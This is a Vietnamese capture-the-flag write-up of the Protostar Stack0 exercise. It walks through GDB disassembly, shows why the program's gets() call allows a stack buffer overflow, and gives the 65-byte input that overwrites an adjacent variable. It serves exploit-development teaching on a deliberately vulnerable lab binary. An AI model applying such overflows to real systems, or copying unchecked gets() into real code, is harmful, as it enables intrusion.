## Stack0
- Challenge: https://exploit.education/protostar/stack-zero/
- Tải virtual machine machine: https://github.com/ExploitEducation/Protostar/releases/download/v2.0.0/exploit-exercises-protostar-2.iso
- Đầu tiên import file iso của protostar vào virtual machine, đăng nhập bằng credentials: `user:user`
- Chạy lệnh `/sbin/ifconfig` để lấy địa chỉ IP và SSH vào
- Nếu gặp lỗi `Unable to negotiate with 192.168.1.15 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss` thì thêm option `-oHostKeyAlgorithms=+ssh-dss`
```
ssh -oHostKeyAlgorithms=+ssh-dss user@192.168.1.15
```
- source code C:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
- Goal là ta phải ghi đè được biến `modified`
- Dùng GDB `disass main`, chạy `set disassembly-flavour intel` để xem syntax intel asm, nó sẽ đỡ hơn syntax AT&T:
```asm 
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
```
- Đặt break point ở main `(gdb) b main`, rồi run `r`, execution flow sẽ dừng ở địa chỉ `0x080483fd <main+9>`. Gdb sẽ bỏ qua phần stack alignment từ offset `+0` đến `+6`, nếu muốn dừng ngay tại `+0` ta có thể dùng `b *main` (gdb sẽ hiểu là **break tại địa chỉ của main**, thay vì **break tại hàm main**)
- Để ý dòng `0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0`
- Tại đây đang chuyển giá trị 0 vào ô stack `esp+0x5c`, đối chiếu với code C ta có thể thấy đó là dòng `modified = 0;` => `esp+0x5c` là địa chỉ của biến  `modified`
- Trong code C thì nơi ta có thể ghi input vào là tại dòng 11:
```c
gets(buffer);
```
- `gets` là một hàm nguy hiểm, nó sẽ không biến được biến đích rộng bao nhiêu, nó sẽ lấy toàn bộ input đưa vào biến đích, dẫn đến ghi đè vùng nhớ kề bên => buffer overflow
- Ta chỉ có thể ghi đè được các biến nằm phía trên của biến `buffer`, nên ta sẽ phải kiểm tra xem `modified` có nằm ở trên `buffer` không, nhìn vào asm:
```asm 
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
```
- Thấy trước khi gọi đến `gets` thì địa chỉ của `esp+0x1c` được đưa vào thanh ghi `eax`, đoán rằng đây là biến `buffer`, chạy `p ($esp+0x1c) - ($esp+0x5c)` ra kết quả `-64`, thêm với dữ kiện là stack đi từ địa chỉ cao về địa chỉ thấp => `modified` nằm ở địa chỉ cao hơn `buffer`
- Ta cũng biết thêm một điều là biến `modified` và `buffer` cách nhau 64 bytes, nghĩa là nếu ta truyền 64 bytes vào buffer thì byte thứ 65 sẽ được ghi vào `modified` => solved
- Dùng python tạo ra 64 chữ "A", input vào chương trình:
```
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./stack0
Try again?
$ 
```
- Lần này tạo 65 chữ "A":
```
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./stack0
you have changed the 'modified' variable
$ 
```
